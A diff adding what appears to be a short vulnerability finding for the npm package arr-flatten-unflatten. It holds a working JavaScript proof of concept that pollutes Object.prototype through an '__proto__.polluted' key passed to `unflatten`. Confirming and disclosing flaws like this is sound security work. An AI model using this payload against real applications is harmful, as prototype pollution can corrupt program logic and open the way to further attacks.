@@ -1,0 +1,17 @@
+Confirmed: prototype pollution via `unflatten`'s `curr` variable, which walks/creates objects using unsanitized path segments (no `__proto__`/`constructor` filtering).
+
+```javascript
+const { unflatten } = require("./node_modules/arr-flatten-unflatten");
+
+// Malicious flattened key targets Object.prototype via the prototype chain
+const payload = {
+  "__proto__.polluted": "yes"
+};
+
+unflatten(payload);
+
+// Verify pollution of Object.prototype
+const victim = {};
+console.log("victim.polluted:", victim.polluted); // "yes" -> prototype pollution confirmed
+console.log("polluted:", ({}).polluted);
+```
